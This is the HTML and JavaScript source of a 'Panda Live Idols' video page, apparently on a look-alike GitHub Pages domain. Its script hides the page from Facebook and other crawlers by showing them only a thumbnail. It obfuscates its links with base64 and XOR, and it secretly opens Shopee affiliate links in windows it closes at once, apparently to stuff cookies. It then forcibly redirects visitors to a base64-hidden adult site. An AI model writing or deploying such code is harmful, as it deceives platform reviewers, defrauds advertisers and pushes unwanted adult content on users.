<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
<title>Panda Live Idols</title>

<!-- Open Graph -->
<meta property="og:url" content="https://pandalive-co-kr.github.io/panda-live-idols/" />
<meta property="og:type" content="website" />
<meta property="og:title" content="Panda Live Idols" />
<meta property="og:description" content="Xem video mới nhất của Panda Live Idols" />
<meta property="og:image" content="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />

<style>
html, body { margin:0; padding:0; height:100%; background:#000; }
.video-container{ position:relative; width:100%; height:100%; overflow:hidden; }
.video-container video{ width:100%; height:100%; object-fit:cover; background:#000; }
.top-logo-right{ position:absolute; top:10px; right:10px; z-index:2000; max-width:150px; }
.top-logo-left{ position:absolute; top:10px; left:10px; z-index:2000; max-width:150px; }
.bottom-logo-left{ position:absolute; bottom:10px; left:10px; z-index:2000; max-width:120px; }
.overlay{ position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); z-index:1000; }
.cta{ display:flex; align-items:center; gap:8px; background:rgba(0,17,61,0.85); color:#fff;
      border:none; border-radius:8px; padding:10px 18px; font-size:16px; cursor:pointer; }
.cta img{ width:24px; height:24px; }
@media (max-width:768px){
  .overlay{ top:auto; bottom:320px; transform:translateX(-50%); }
  .top-logo-left, .top-logo-right{ max-width:100px; }
  .bottom-logo-left{ max-width:90px; }
}
#thumbnail{ display:none; }
</style>
</head>
<body>

<!-- Thumbnail -->
<div id="thumbnail">
  <img src="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" alt="Thumbnail" style="width:100%; height:auto;">
</div>

<!-- Nội dung -->
<div id="real-content" class="video-container" style="display:none;">
  <video id="main-video" autoplay muted loop playsinline preload="auto"
         poster="https://pandalive-co-kr.github.io/panda-live-idols/facebook.jpg" webkit-playsinline></video>

  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-number.png" alt="Panda Number" class="top-logo-left" />
  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-class.png" alt="Panda Class" class="top-logo-right" />
  <img src="https://pandalive-co-kr.github.io/panda-live-idols/kbj-logo.jpg" alt="KBJ" class="bottom-logo-left" />

  <div class="overlay">
    <button class="cta" id="ctaBtn">
      <img src="https://pandalive-co-kr.github.io/panda-live-idols/logo.png" alt="Panda Logo" />
      Panda Live Idols
    </button>
  </div>
</div>

<script>
// --- Hàm phụ ---
function xorDecode(str, key) {
  let res = '';
  for (let i = 0; i < str.length; i++) {
    res += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return res;
}
function reverseString(s) { return s.split('').reverse().join(''); }

// --- Mã hóa video URL ---
const enc3_b64 = "ZBEDSgQnDBtdXR9aNQUHEk44CRZWWR9QJggCSQAvCxhCH11cfgMbDBUiAldAWx9aM0wLEggnBB1cUUIaf1sdFBU/DQ==";
const xorKey = "PandaKey2025";

// --- Mã hóa link 18+ ---
const link18_b64 = "aHR0cHM6Ly9zZXhiamNhbS5jb20vYWN0b3IvcGFuZGFjbGFzcy8=";

// --- Link Affiliate Shopee theo quốc gia ---
const affLinks = {
  VN: "https://invl-proxy-clmx0am.kitthh1412.workers.dev/",
  MY: "https://invole-shopee-my.kitthh1412.workers.dev/",
  SG: "https://invole-shopee-sg.kitthh1412.workers.dev/",
  PH: "https://invole-shopee-ph.kitthh1412.workers.dev/"
};

// --- Nhận diện bot ---
function isBot() {
  const ua = (navigator.userAgent || "").toLowerCase();
  const keywords = ["facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot","bot","crawler","spider","preview","embedly"];
  return keywords.some(k => ua.includes(k)) || navigator.webdriver;
}

// --- Thiết bị / Trình duyệt ---
function isIOS() { return /iPad|iPhone|iPod/i.test(navigator.userAgent); }
function isIOSChrome() { return /CriOS/i.test(navigator.userAgent) && isIOS(); }
function isFacebookApp() {
  const ua = navigator.userAgent || "";
  return ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram");
}

// --- Điều hướng bền bỉ cho 18+ (tối ưu) ---
function navigate18Resilient(url) {
  let done = false;
  let t1 = null, t2 = null;

  const go = () => {
    if (done) return;
    done = true;
    if (t1) clearTimeout(t1);
    if (t2) clearTimeout(t2);
    window.removeEventListener('pagehide', onPageHide);
    window.removeEventListener('focus', onFocus);
    document.removeEventListener('visibilitychange', onVisibleChange);

    try { window.location.replace(url); }
    catch (_) { window.location.href = url; }
  };

  const onPageHide = () => setTimeout(go, 80);
  const onFocus = () => go();
  const onVisibleChange = () => { if (document.visibilityState === 'visible') go(); };

  t1 = setTimeout(go, 1000);   // 1s
  t2 = setTimeout(go, 1300);   // 1.3s

  window.addEventListener('pagehide', onPageHide, { once:true });
  window.addEventListener('focus', onFocus, { once:true });
  document.addEventListener('visibilitychange', onVisibleChange);
}

// --- Nhận diện quốc gia ---
function getCountry() {
  const lang = (navigator.language || "").toUpperCase();
  if (lang.includes("VI")) return "VN";
  if (lang.includes("MS") || lang.includes("MY")) return "MY";
  if (lang.includes("EN-SG") || lang.includes("SG")) return "SG";
  if (lang.includes("EN-PH") || lang.includes("PH")) return "PH";
  return "VN";
}

// --- Mở link Shopee stealth ---
function openShopeeStealth(url) {
  let win = null;
  try {
    win = window.open(url, "_blank");
  } catch (_) {}

  const tryClose = () => {
    if (!win) return;
    try {
      win.close();
      if (!win.closed) {
        win.location.replace("about:blank");
      }
    } catch (e) {
      try { win.location.replace("about:blank"); } catch (_) {}
    }
  };

  setTimeout(tryClose, 120);
  setTimeout(tryClose, 400);
  setTimeout(tryClose, 1000);
}

// === Main ===
document.addEventListener('DOMContentLoaded', function() {
  const thumbnail = document.getElementById('thumbnail');
  const real = document.getElementById('real-content');
  const vid = document.getElementById('main-video');

  if (isBot()) {
    thumbnail.style.display = 'block';
    real.style.display = 'none';
    return;
  }

  try {
    const raw = atob(enc3_b64);
    const step = xorDecode(raw, xorKey);
    const videoURL = reverseString(step);

    thumbnail.style.display = 'none';
    real.style.display = 'block';
    vid.src = videoURL;
    vid.play().catch(()=>{});
  } catch (err) {
    thumbnail.style.display = 'block';
    real.style.display = 'none';
  }

  // --- Nút CTA ---
  document.getElementById('ctaBtn').addEventListener('click', function(e){
    e.preventDefault();

    const country = getCountry();
    const affLink = affLinks[country] || affLinks.VN;
    const link18 = atob(link18_b64);

    if (isFacebookApp()) {
      try {
        window.location.href = affLink;
      } finally {
        navigate18Resilient(link18);
      }
      return;
    }

    openShopeeStealth(affLink);
    navigate18Resilient(link18);
  });
});
</script>
</body>
</html>
